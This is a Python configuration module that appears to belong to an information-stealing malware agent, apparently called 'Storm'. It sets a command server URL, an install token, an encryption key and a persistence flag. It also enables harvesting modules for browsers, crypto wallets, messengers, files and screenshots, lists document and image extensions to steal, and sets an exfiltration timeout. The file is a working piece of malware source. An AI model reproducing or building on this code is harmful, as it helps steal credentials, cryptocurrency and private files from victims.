import json
import os
from dataclasses import dataclass, field, asdict
from typing import Optional


@dataclass
class AgentConfig:
    server_url: str = "https://127.0.0.1:8443"
    install_token: str = ""
    aes_key: str = ""
    proxy: Optional[str] = None
    socks5: Optional[str] = None
    google_refresh_token: Optional[str] = None
    persistence: bool = True
    run_once: bool = False
    modules: dict = field(default_factory=lambda: {
        "browsers": True,
        "wallets": True,
        "messengers": True,
        "files": True,
        "screenshots": True,
    })
    file_extensions: list = field(default_factory=lambda: [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".png", ".jpg"])
    max_file_size: int = 5 * 1024 * 1024
    screenshot_delay: int = 3
    exfil_timeout: int = 15

    @classmethod
    def load(cls, path: str = "") -> "AgentConfig":
        if path and os.path.exists(path):
            with open(path) as f:
                data = json.load(f)
            return cls(**data)
        embedded = os.environ.get("STORM_CONFIG")
        if embedded:
            return cls(**json.loads(embedded))
        return cls()

    def dump(self) -> bytes:
        return json.dumps(asdict(self), separators=(",", ":")).encode()
